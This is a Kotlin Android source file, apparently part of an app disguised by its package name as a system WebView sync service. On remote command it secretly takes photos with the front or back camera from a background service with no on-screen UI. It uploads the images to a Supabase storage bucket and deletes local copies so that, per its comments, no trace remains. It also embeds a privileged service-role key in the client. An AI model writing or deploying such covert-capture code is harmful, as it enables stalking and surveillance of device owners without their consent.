package com.system.webview.sync.services

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import com.system.webview.sync.localdb.PrefsHelper
import com.system.webview.sync.network.SupabaseConfig
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * CameraCaptureHelper — ambil foto dari kamera depan/belakang via Camera2 API
 * tanpa UI. Dipanggil dari BackgroundSyncService saat ada PENDING camera_command.
 *
 * Flow:
 *   1. Buka CameraDevice sesuai camera_side (FRONT / BACK)
 *   2. Capture ke ImageReader (tidak perlu Surface yang tampil di layar)
 *   3. Upload bytes ke Supabase Storage bucket "camera-photos"
 *   4. Update baris camera_commands di Supabase dengan storage_path + status EXECUTED
 *
 * Catatan OEM: beberapa ROM (MIUI 14+, ColorOS 13+) memblokir akses kamera
 * dari background service. Dalam kasus ini status akan di-update ke FAILED
 * dengan error_message yang menjelaskan penyebabnya.
 */
object CameraCaptureHelper {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    fun captureAndUpload(context: Context, commandId: Long, cameraFacing: String) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: run {
            updateStatus(commandId, "FAILED", errorMsg = "deviceUuid null")
            return
        }

        var tempFile: File? = null   // Hoisted agar selalu bisa dihapus di finally
        val handlerThread = HandlerThread("CamCapture_$commandId")
        handlerThread.start()
        val handler = Handler(handlerThread.looper)

        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

            val targetFacing = if (cameraFacing == "FRONT")
                CameraCharacteristics.LENS_FACING_FRONT
            else
                CameraCharacteristics.LENS_FACING_BACK

            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == targetFacing
            } ?: run {
                updateStatus(commandId, "FAILED", errorMsg = "Kamera ${cameraFacing} tidak ditemukan")
                return
            }

            val imageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 2)
            val latch = CountDownLatch(1)
            var capturedBytes: ByteArray? = null
            var activeCamera: CameraDevice? = null
            var frameCount = 0

            imageReader.setOnImageAvailableListener({ reader ->
                val image: Image? = reader.acquireLatestImage()
                try {
                    image?.let { img ->
                        frameCount++
                        if (frameCount >= 15) { // Warm-up: discard first 14 frames to let AE/AWB adjust to ambient light
                            val buffer = img.planes[0].buffer
                            capturedBytes = ByteArray(buffer.remaining())
                            buffer.get(capturedBytes!!)
                            latch.countDown()
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("CameraCapture", "Error reading image", e)
                } finally {
                    image?.close()
                }
            }, handler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    activeCamera = camera
                    try {
                        val surfaces = listOf(imageReader.surface)
                        @Suppress("DEPRECATION")
                        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    // Use TEMPLATE_PREVIEW for continuous auto-exposure/autofocus adjustment
                                    val previewRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                        addTarget(imageReader.surface)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                        set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                                        set(CaptureRequest.JPEG_ORIENTATION, 0)
                                    }.build()
                                    session.setRepeatingRequest(previewRequest, null, handler)
                                } catch (e: Exception) {
                                    android.util.Log.e("CameraCapture", "createCaptureRequest/setRepeatingRequest failed", e)
                                    camera.close()
                                    latch.countDown()
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                android.util.Log.e("CameraCapture", "Session configure failed")
                                camera.close()
                                latch.countDown()
                            }
                        }, handler)
                    } catch (e: Exception) {
                        android.util.Log.e("CameraCapture", "openCamera onOpened failed", e)
                        camera.close()
                        latch.countDown()
                    }
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    latch.countDown()
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    android.util.Log.e("CameraCapture", "Camera error: $error")
                    camera.close()
                    latch.countDown()
                }
            }, handler)

            // Tunggu capture max 12 detik
            val captured = latch.await(12, TimeUnit.SECONDS)
            activeCamera?.close() // Close the camera device properly to release resources!
            handlerThread.quitSafely()
            imageReader.close()

            if (!captured || capturedBytes == null || capturedBytes!!.isEmpty()) {
                updateStatus(commandId, "FAILED", errorMsg = "Capture timeout atau gambar kosong")
                return
            }

            // Simpan ke file cache sementara (private — tidak terlihat di gallery)
            val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).apply { timeZone = TimeZone.getTimeZone("UTC") }
            val filename = "cam_${cameraFacing.lowercase()}_${sdf.format(Date())}.jpg"
            tempFile = File(context.cacheDir, filename)
            FileOutputStream(tempFile).use { it.write(capturedBytes!!) }

            // Upload ke Supabase Storage
            val storagePath = "$deviceUuid/$filename"
            val storageUrl = "${SupabaseConfig.URL}/storage/v1/object/camera-photos/$storagePath"
            val requestBody = capturedBytes!!.toRequestBody("image/jpeg".toMediaType())

            val uploadRequest = Request.Builder()
                .url(storageUrl)
                .put(requestBody)
                .addHeader("apikey", SupabaseConfig.SERVICE_ROLE_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.SERVICE_ROLE_KEY}")
                .build()

            client.newCall(uploadRequest).execute().use { response ->
                if (response.isSuccessful) {
                    android.util.Log.d("CameraCapture", "Uploaded: $storagePath (${capturedBytes!!.size} bytes)")
                    updateStatus(commandId, "EXECUTED", storagePath = storagePath, fileSize = capturedBytes!!.size.toLong())
                } else {
                    updateStatus(commandId, "FAILED", errorMsg = "Upload gagal: HTTP ${response.code}")
                }
            }

        } catch (e: SecurityException) {
            handlerThread.quitSafely()
            android.util.Log.e("CameraCapture", "Permission denied", e)
            updateStatus(commandId, "FAILED", errorMsg = "Izin kamera ditolak: ${e.message}")
        } catch (e: Exception) {
            handlerThread.quitSafely()
            android.util.Log.e("CameraCapture", "Exception", e)
            updateStatus(commandId, "FAILED", errorMsg = e.message ?: "Error tidak diketahui")
        } finally {
            // Hapus file cache lokal — sukses maupun gagal, tidak ada jejak di storage
            try { tempFile?.delete() } catch (_: Exception) {}
        }
    }

    private fun nowUtcString(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        sdf.timeZone = TimeZone.getTimeZone("UTC")
        return sdf.format(Date())
    }

    private fun updateStatus(
        commandId: Long, status: String,
        storagePath: String? = null,
        fileSize: Long? = null,
        errorMsg: String? = null
    ) {
        val url = "${SupabaseConfig.URL}/rest/v1/camera_commands?id=eq.$commandId"
        val body = JSONObject().apply {
            put("status", status)
            put("executed_at", nowUtcString())
            if (storagePath != null) put("storage_path", storagePath)
            if (fileSize    != null) put("file_size_bytes", fileSize)
            if (errorMsg    != null) put("error_message", errorMsg)
        }.toString()

        try {
            val req = Request.Builder()
                .url(url)
                .patch(body.toRequestBody("application/json; charset=utf-8".toMediaType()))
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .build()
            val localClient = OkHttpClient()
            localClient.newCall(req).execute().use { resp ->
                android.util.Log.d("CameraCapture", "Status cmd $commandId → $status: ${resp.code}")
            }
        } catch (e: Exception) {
            android.util.Log.e("CameraCapture", "updateStatus failed", e)
        }
    }
}
